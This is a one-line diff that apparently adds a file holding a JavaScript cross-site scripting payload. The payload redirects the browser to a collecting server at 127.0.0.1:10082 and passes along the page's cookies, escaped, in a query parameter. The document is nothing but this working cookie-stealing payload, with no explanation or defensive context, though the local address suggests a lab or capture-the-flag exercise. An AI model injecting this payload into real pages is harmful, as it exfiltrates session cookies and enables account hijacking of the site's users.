@@ -1,0 +1,1 @@
+location.href="http://127.0.0.1:10082/public/?c="+escape(document.cookie);
